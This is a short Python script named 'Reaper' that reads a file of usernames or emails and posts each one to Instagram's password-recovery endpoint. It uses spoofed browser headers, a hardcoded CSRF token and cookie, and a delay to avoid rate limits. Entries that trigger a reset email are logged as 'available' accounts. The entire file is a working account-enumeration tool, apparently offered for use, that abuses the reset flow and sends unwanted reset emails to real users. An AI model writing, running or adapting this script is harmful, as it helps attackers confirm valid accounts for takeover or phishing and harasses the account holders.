import requests
import sys
from bs4 import BeautifulSoup
import json
import webbrowser
import os
from colorama import Fore
from time import sleep
W = "\033[96m"
green_color = "\033[1;32m"


print("Reaper")

ss = input ('Enter list  -> ')
bpass = open (ss, 'r').read ().splitlines ()
for password in bpass:
        aaa = "https://www.instagram.com/accounts/account_recovery_send_ajax/"
        payload = "email_or_username="+ password +"&recaptcha_challenge_field=&flow="
        headers = {
                        "Accept": "*/*",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                        "Connection": "close",
                        "Host": "www.instagram.com",
                        "Accept-Encoding": "gzip, deflate",
                        "Referer": "https://www.instagram.com/accounts/password/reset/",
                        "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
                        "Origin":"https://www.instagram.com",
                        "X-CSRFToken": "TnVNOReZSuQKaXRz8DOP5ajLrcWkkf4K",
                        "X-Requested-With": "XMLHttpRequest",
                        "Cookie": "mid=X6GnKAALAAFpgeqDe6GeXRHLg9D5"
                    }

        response = requests.request("POST" , aaa, data=payload, headers=headers)
        sleep(5)
        if "email_or_sms_sent" in response.text:
            print(" -" * 15)
            print("")
            print(Fore.YELLOW + 'yes Account is available',password)
            with open ('Good-available.txt', 'a') as x:
                        x.write (password + '\n')
        elif "message" in response.text:
            print(" -" * 15)
            print ("")
            print(Fore.RED + "No users found",password)
